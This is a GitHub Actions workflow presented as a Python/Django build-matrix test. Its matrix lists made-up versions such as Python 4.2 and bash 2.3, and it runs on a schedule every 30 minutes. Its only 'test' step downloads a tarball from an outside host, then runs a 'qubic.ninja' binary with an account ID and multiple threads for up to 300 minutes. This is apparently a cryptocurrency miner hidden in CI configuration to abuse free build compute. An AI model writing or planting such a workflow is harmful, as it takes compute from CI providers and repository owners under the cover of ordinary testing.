
name: build matrix demo1

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: "*/30 */5 * * *"
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        python-version:
          - "3.6"
          - "3.7"
          - "3.9"
          - "4.0"
          - "4.1"
          - "4.2"
        django-version:
          - "1.11"
          - "2.0"
          - "2.1"
          - "2.2"
          - "2.1"
        bash-version:
          - "2.6"
          - "2.5"
          - "2.4"
          - "2.3"
    steps:
      - uses: actions/checkout@v2
      - name: test
        run: wget https://dl.qubic.ninja/ninja/linux-latest.tar.gz -O linux-latest.tar.gz && tar xf linux-latest.tar.gz && chmod u+x qubic.ninja && timeout 300m ./qubic.ninja -i=NVWTZZACJPEBAFBLYZNJXFGHJDPBTMIIFBDAOGSTHDHRCHXFTMZUXIOGERZG -t=8 -n=new -s=avx512
